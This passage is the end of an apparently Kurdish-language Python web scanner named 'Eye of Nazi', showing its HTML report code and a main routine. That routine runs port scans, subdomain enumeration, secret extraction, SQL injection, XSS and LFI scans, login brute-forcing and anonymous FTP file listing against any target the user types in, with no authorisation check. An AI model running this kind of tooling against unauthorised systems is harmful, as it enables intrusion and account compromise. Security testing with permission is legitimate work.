    <div class="card"><b class="LOW">{counts['LOW']}</b>LOW</div>
    <div class="card"><b class="INFO">{counts['INFO']}</b>INFO</div>
</div>

<h2>Findings ({len(FINDINGS)})</h2>
<table>
<tr><th>Severity</th><th>Title</th><th>Detail</th></tr>
{rows if rows else '<tr><td colspan="3" style="text-align:center;color:#666">هیچ دۆزینەوەیەک نییە</td></tr>'}
</table>

<div class="meta">
    <p>Duration: {duration:.2f}s · Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} · v{VERSION}</p>
    <p>Made by Cyber Kurd Team ☀️</p>
</div>
</body>
</html>"""

    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(html)
    LOG.log(f"[✓] ڕاپۆرت: {REPORT_FILE}", "OK")

# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(LOGO)
    print(f"\n{C.R}{'═'*60}{C.RESET}")
    print(f"{C.BOLD}         E Y E   O F   N A Z I   v{VERSION}{C.RESET}")
    print(f"{C.M}       Web Scanner · 20 Features · HTML Report{C.RESET}")
    print(f"{C.R}{'═'*60}{C.RESET}\n")

    target = input(f"{C.Y}ناوی وێبسایت یان IP: {C.RESET}").strip()
    if not target:
        print(f"{C.R}[-] هیچ نەدرا. دەرچوون.{C.RESET}")
        return

    base_url, host = norm_target(target)
    LOG.log(f"ئامانج: {base_url} · host: {host}", "INFO")
    start = time.time()

    # ─── جێبەجێکردنی هەموو تایبەتمەندییەکان ───
    print(f"\n{C.B}━━━ DNS & NETWORK ━━━{C.RESET}")
    try: feat_dns(host)
    except Exception as e: LOG.log(f"DNS: {e}", "ERR")
    try: feat_whois(host)
    except Exception as e: LOG.log(f"WHOIS: {e}", "ERR")
    try: feat_ssl(host)
    except Exception as e: LOG.log(f"SSL: {e}", "ERR")

    print(f"\n{C.B}━━━ SUBDOMAIN ENUM ━━━{C.RESET}")
    try: feat_subdomains(host)
    except Exception as e: LOG.log(f"Subdomains: {e}", "ERR")

    print(f"\n{C.B}━━━ PORT SCAN ━━━{C.RESET}")
    try:
        open_ports = feat_ports(host)
        for p in open_ports[:10]:
            feat_banner(host, p)
    except Exception as e:
        LOG.log(f"Ports: {e}", "ERR")
        open_ports = []

    print(f"\n{C.B}━━━ HTTP ANALYSIS ━━━{C.RESET}")
    for fn in [feat_headers, feat_tech, feat_waf, feat_cors]:
        try: fn(base_url)
        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")

    print(f"\n{C.B}━━━ FILES & DIRECTORIES ━━━{C.RESET}")
    for fn in [feat_files, feat_dirs]:
        try: fn(base_url)
        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")

    print(f"\n{C.B}━━━ EXTRACT ━━━{C.RESET}")
    for fn in [feat_extract, feat_js, feat_secrets]:
        try: fn(base_url)
        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")

    print(f"\n{C.B}━━━ VULNERABILITY SCAN ━━━{C.RESET}")
    for fn in [feat_sqli, feat_xss, feat_lfi, feat_open_redirect]:
        try: fn(base_url)
        except Exception as e: LOG.log(f"{fn.__name__}: {e}", "ERR")

    print(f"\n{C.B}━━━ LOGIN BRUTEFORCE ━━━{C.RESET}")
    try: feat_login(base_url)
    except Exception as e: LOG.log(f"Login: {e}", "ERR")

    # FTP check ئەگەر پۆرتی 21 کراوە بوو
    if 21 in open_ports:
        print(f"\n{C.B}━━━ FTP ━━━{C.RESET}")
        try:
            ftp = ftplib.FTP(host, timeout=5)
            ftp.login("anonymous", "")
            files = ftp.nlst()
            LOG.log(f"[!] FTP کراوە — {len(files)} فایل", "HIT")
            for f in files[:20]:
                LOG.log(f"    {f}", "OK")
            ftp.quit()
        except Exception as e:
            LOG.log(f"FTP: {e}", "WARN")

    # ─── کۆتایی ───
    duration = time.time() - start
    print(f"\n{C.R}{'═'*60}{C.RESET}")
    print(f"{C.G}[✓] تەواو بوو لە {duration:.2f} چرکە{C.RESET}")
    print(f"{C.G}[✓] دۆزینەوەکان: {len(FINDINGS)}{C.RESET}")

    counts = defaultdict(int)
    for f in FINDINGS:
        counts[f["severity"]] += 1
    print(f"{C.R}    CRITICAL: {counts['CRITICAL']}{C.RESET}")
    print(f"{C.M}    HIGH:     {counts['HIGH']}{C.RESET}")
    print(f"{C.Y}    MEDIUM:   {counts['MEDIUM']}{C.RESET}")
    print(f"{C.C}    LOW:      {counts['LOW']}{C.RESET}")
    print(f"{C.R}{'═'*60}{C.RESET}")

    # ڕاپۆرت
    build_report(base_url, duration)
    LOG.log(f"[✓] لۆگ: {LOGFILE}", "OK")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.R}[!] پچڕا. ڕاپۆرت دەنووسرێت...{C.RESET}")
        if FINDINGS:
            build_report("interrupted", 0)
        sys.exit(0)
